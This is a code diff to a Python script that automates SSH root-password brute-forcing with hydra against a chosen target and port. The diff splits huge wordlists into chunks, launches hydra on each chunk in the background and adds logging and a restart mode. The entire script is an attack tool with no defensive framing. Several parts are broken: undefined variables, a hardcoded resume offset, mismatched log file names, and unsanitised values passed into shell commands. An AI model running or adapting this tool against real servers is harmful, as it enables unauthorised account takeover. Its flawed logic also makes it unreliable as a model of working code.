@@ -3,6 +3,7 @@
 import os
 import sys
 import getopt
+import time
 
 options, ars = getopt.getopt(sys.argv[1:], 'hRt:p:i:')
 target = ""
@@ -11,33 +12,37 @@ inputFile = ""
 helpOption = 0
 restart = 0
 
-def copyFile(inputFile):
-    lastLine = ""
-    with open("nohup.out","r") as f:
-        lastLine = f.readlines()[-1]
-    password = lastLine.split()[8].strip("\"")
+
+def inputFileProcessing(inputFile):
+    fileList = []
+    with open(inputFile, "r", encoding = "utf-8") as f:
+        originalData = f.readlines()
+        if len(originalData)>50000000:
+            cnt = 1
+            fileName_Num = 0
+            fileList.append(inputFile+"_"+"0")
+
+            for line in originalData:
+                fileName = inputFile + "_" + str(fileName_Num)  
+                
+
+                fw = open(fileName, "a")
+                fw.write(line)
+                fw.close()
+
+                if cnt == 50000000:
+                    fileName_Num +=  1
+                    fileName = inputFile + "_" + str(fileName_Num)   
+                    fileList.append(fileName)
+                    cnt = 0
+
+                cnt += 1
+        else:
+            fileList.append(inputFile)
     
-    index = -1
-    with open(inputFile, "r", encoding = 'cp949') as f:
-        line = None
-        while line != ' ':
-            line=f.readline()
-            index += 1
-            if line.find(password):
-                break
+    return fileList
+                
 
-    copiedFilePath = os.path.dirname(inputFile) + "copied_file"
-    with open(inputFile, "r", encoding = 'cp949') as f:
-        with open(copiedFilePath,"w") as fc:
-            copyIndex = -1
-            line = None
-            while line != ' ':
-                line = f.readline()
-                copyIndex += 1
-                if copyIndex > index:
-                    fc.write(line)
-
-    return copiedFilePath 
 
     
 
@@ -54,9 +59,61 @@ for op ,p in options:
     elif op == '-R':
         restart+=1        
 
+def bruteForcing(file):
+    fLog = open("bfLog.txt","a")
+    now = time.localtime()
+    nowTime = "%04d/%02d/%02d %02d:%02d:%02d" % (now.tm_year, now.tm_mon, now.tm_mday, now.tm_hour, now.tm_min, now.tm_sec)
+    fLog.write(nowTime + " "+ file + " start")
+    os.system('nohup hydra -l root -P '+ file + ' -f '+ target + " ssh -s " + port +" &")
+    fLog.close()
 
 if helpOption == 0 and restart == 0:
-    os.system('nohup hydra -l root -P '+ inputFile + ' -f '+ target + " ssh -V -I -s " + port +" &")
+    fileList = inputFileProcessing(inputFile)
+    print(fileList) 
+    for file in fileList:
+        bruteForcing(file)
+        fLog = open("bfLog.txt","a")
+        fNohup = open("nohup.out","r")
+        outputData = fNohup.readlines()
+        if "valid password found" in outputData:
+            fLog.write("1 result has found in nohup")
+            fNohup.close()
+            fLog.close()
+             
+
+        else:
+            nowTime = "%04d/%02d/%02d %02d:%02d:%02d" % (now.tm_year, now.tm_mon, now.tm_mday, now.tm_hour, now.tm_min, now.tm_sec)
+            fLog.write(nowTime + " " + file + " end")
+            fLog.write("no password found")
+            fNohup.close()
+            os.system("rm -rf nohup.out")
+        fLog.close()
+
 elif helpOption == 0 and restart == 1:
-    filePath = copyFile(inputFile) 
-    os.system('nohup hydra -l root -P '+ filePath +  ' -f '+ target + " ssh -V -I -s " + port +" &")
+    fLog = open("bLog.txt","r")
+    fileData = fLog.readlines()
+    fLog.close()
+
+
+    fileList = inputFileProcessing(inputFile)
+    fileIndex = fileList.index(lastFileName)
+    fileList = fileList[5:]
+    for file in fileList:
+        bruteForcing(file)
+        fLog = open("bfLog.txt","a")
+        fNohup = open("nohup.out","r")
+        outputData = fNohup.readlines()
+        if "valid password found" in outputData:
+            fLog.write("1 result has found in nohup")
+            fNohup.close()
+            fLog.close()
+
+        else:
+            nowTime = "%04d/%02d/%02d %02d:%02d:%02d" % (now.tm_year, now.tm_mon, now.tm_mday, now.tm_hour, now.tm_min, now.tm_sec)
+            fLog.write(nowTime + " " + file + " end")
+            fLog.write("no password found")
+            fNohup.close()
+            os.system("rm -rf nohup.out")
+        fLog.close()
+
+    
